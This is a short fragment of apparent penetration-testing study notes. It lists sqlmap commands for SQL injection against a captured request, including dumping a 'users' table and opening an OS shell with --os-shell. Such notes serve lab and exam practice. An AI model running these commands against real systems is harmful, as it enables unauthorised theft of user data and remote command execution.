...
```
```bash
# sqlmap (great for blind/time-based; NOT an "automated exploit" violation)
sqlmap -r req.txt --batch --dbs
sqlmap -r req.txt --batch -D db -T users --dump
sqlmap -r req.txt --batch --os-shell        # use sparingly; manual preferred for learning
```
